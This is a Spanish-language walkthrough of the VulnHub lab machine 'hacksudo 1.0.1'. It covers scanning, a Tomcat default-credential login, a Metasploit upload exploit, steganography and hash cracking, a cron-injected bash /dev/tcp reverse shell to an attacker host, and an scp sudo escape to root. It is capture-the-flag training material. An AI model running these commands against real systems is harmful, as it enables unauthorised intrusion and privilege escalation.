<h1 align="center">
<br>
  <img src="https://anaparrillablog.files.wordpress.com/2016/04/cayo-julio-cc3a9sar-imperio-romano.png?w=656" alt="Front-End Checklist" width="200">
  <br>
  HACKSUDO: 1.0.1
  <br>
</h1>

<h4 align="center">Maquina creada por <img src="https://img.icons8.com/fluent/344/email-open.png" alt="Front-End Checklist" width="20">vishal@hacksudo.comr</h4>
<h4 align="center">Aquí puedes descargarte la <a href="https://www.vulnhub.com/entry/hacksudo-101,650/">máquina</a> y ver una descripción de ella</h4>

---

# Índice

- [Recopilación de información](#recopilación-de-información)
  - [Nmap](#nmap)
  - [Fuzz / Whatweb](#fuzz--whatweb)
- [Búsqueda de vulnerabilidades](#búsqueda-de-vulnerabilidades)
  - [Tomcat](#tomcat)
- [Explotación de vulnerabilidades](#explotación-de-vulnerabilidades)
  - [Reverse Shell](#reverse-shell)
- [Post-explotación](#post-explotación)
  - [Movimiento Lateral I](#movimiento-lateral-i)
  - [Movimiento Lateral II](#movimiento-lateral-ii)
       - [linPEAS](#linpeas)
       - [Reverse Shell](#reverse-shell-1)
  - [Búsqueda de vulnerabilidades](#búsqueda-de-vulnerabilidades-1)
       - [SUDO -L](#sudo--l)
  - [Explotación de vulnerabilidades](#explotación-de-vulnerabilidades-1)
       - [SCP](#scp)
- [Información Adicional](#información-adicional)


---

## Recopilación de información

Aquí veremos que esta conectado a la subred, los puerto abiertos, las paginas web, etc.

### Nmap
Veremos que redes estan conectadas a esta subred con este comando:

```nmap -sP 192.168.221.0/24```

Para ver los puertos abiertos que tiene la red utilizaremos este comando:

```nmap -sV -sC 192.168.221.9```

### Fuzz / Whatweb
Para fuzzear la web usaremos este comando con una wordlist que tengamos:

```ffuf -c -w /opt/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://192.168.221.9/FUZZ```

Para ver solo archivos con extensión .txt,.php,.html

```
ffuf -c -w /opt/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.221.9/FUZZ -e .txt,.html,.php -ic
```

Con este comando podemos recolectar información de un servidor web:
```whatweb http://192.168.221.9```

## Búsqueda de vulnerabilidades

### Tomcat

El login del tomcat lo hemos encontrado en esta url: ```http://192.168.221.9:8080/manager```

En esta [página web ](https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown) encontramos las credenciales por defecto.

Conseguimos conectarnos con las credenciales por defecto: 
```
User: tomcat
Password: tomcat
```
## Explotación de vulnerabilidades

### Reverse Shell

Para obtener un reverse shell buscaremos en el metasploit la version del tomcat que podemos verlo en la página web del tomcat.

Dentro del metasploit escribiremos esto:
```
use multi/http/tomcat_mgr_upload
set lhost 192.168.221.4
set rport 8080
set HttpPassword tomcat
set HttpUsername tomcat
set rhosts 192.168.221.9
exploit
```
Con esto obtendremos control del usuario **www-data**

## Post-explotación

## Movimiento Lateral I

Después de algo de enumeración encontramos en la carpeta **/var** una que se llama **backups/hacksudo**

Dentro tenemos unos archivos:
```log.txt```, ```hacksudo.zip``` y ```vishal.jpg```

En el archivo **log.txt** aparece esto:
```
ilovestegno
```

> Lo tomaremos como una pista para saber que hay un proceso de **esteganografía**

En el archivo **hacksudo.zip** no tenemos nada importante

Lo que haremos con este archivo **vishal.jpg**, és extraer los datos ocultos con la herramienta [StegSeek](https://github.com/RickdeJager/stegseek)

Usaremos este comando con docker:

```sudo docker run --rm -it -v "$(pwd):/steg" rickdejager/stegseek vishal.jpg rockyou.txt```

> ⚠️ IMPORTANTE: Tener tanto el archivo vishal.jpg como el wordlist que usaremos en la misma carpeta

Esto es lo que recibimos al ejecutar el comando anterior:

<img src="https://i.gyazo.com/e509cd614352dd3dacfa16f7349f2ef4.png">

Siguiendo leeremos el archivo .out que muestra esto concretamente:

```
onpxhc bs unpxfhqb znpuvar hfre
hfre ivfuny
cnffjbeq 985nn195p09so7q64n4oo24psr51so1s13rop444p494r765rr99q6p3rs46557p757787s8s5n6r0260q2r0r846q263sosor1311p884oo0os9792s8778n4434327
```

Tras una buena búsqueda entendemos que puede estar cifrado en **ROT13**, sabiendo esto lo pasaremos por el [CyberChef](https://gchq.github.io/CyberChef/) y nos dara este resultado:

```
backup of hacksudo machine user
user vishal
password 985aa195c09fb7d64a4bb24cfe51fb1f13ebc444c494e765ee99d6c3ef46557c757787f8f5a6e0260d2e0e846d263fbfbe1311c884bb0bf9792f8778a4434327
```

Con esto copiaremos el hash de la password y la llevaremos a [CrackStation](https://crackstation.net/) y este sera el resultado:

```
Result: hacker
```

Con esto ya tenemos las credenciales del usuario **vishal**

Con el comando ```su vishal``` y poniendo la contraseña sacada anteriormente completaremos el primer Movimiento Lateral.


## Movimiento Lateral II

### linPEAS

Para el siguiente Movimiento Lateral para convertirnos como el usuario hacksudo primero pasaremos el [linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) para ver que podemos recibir

Buscando la información sacada por parte de [linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) encontramos esta línea:

```
*/1 *   * * *   hacksudo /home/hacksudo/./getmanager
```

Lo que haremos es leer ese archivo a ver que podemos encontrar.

En este caso encontraremos otra dirección que es esta: ```/home/vishal/office/manage.sh```

### Reverse Shell

Leeremos el archivo viendo que esta en bash y le añadiremos una reverse shell para ver si podemos escalar privilegios.

Usaremos este reverse shell: ```bash -i >& /dev/tcp/192.168.221.4/4444 0>&1```

Y obviamente podremos un puerto en escucha: ```rlwrap nc -nvlp 4444```

Con esto finalizamos el segundo Movimiento Lateral para conseguir el usuario **hacksudo**

## Búsqueda de vulnerabilidades

### SUDO -L

Para ver que puede ejecutar este usuario como root usaremos el comando ```sudo -l```

El resultado es este:
```
(root) NOPASSWD: /usr/bin/scp
```

## Explotación de vulnerabilidades

### SCP

Al ver esto iremos a esta [página web](https://gtfobins.github.io/gtfobins/scp/#sudo) para ver como podemos explotar esta vulnerabilidad y ser **root**

Encontramos estos comandos que nos ayudara a escalar privilegios:

```
TF=$(mktemp)
echo 'sh 0<&2 1>&2' > $TF
chmod +x "$TF"
sudo scp -S $TF x y:
```

Gracias a esto conseguirmos ser **root**

## Información Adicional

Páginas web utilizadas:

- [Tomcat Default Credentials](https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown) - Aquí tenemos todas las credenciales por defecto del Tomcat

- [StegSeek](https://github.com/RickdeJager/stegseek) - Una herramienta para sacar datos/archivos escondidos de un archivo

- [CyberChef](https://gchq.github.io/CyberChef/) - Aplicación Web para encriptar, codificar, comprimir y análisis de datos

- [CrackStation](https://crackstation.net/) - Aplicación Web para crackear hashes

- [linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) - Enumeración de escalada de privilegios local.

- [GTFOBins SCP](https://gtfobins.github.io/gtfobins/scp/#sudo) - Escalada de privilegios SUDO con el SCP

**[⬆ back to top](#-----hacksudo-101-)**
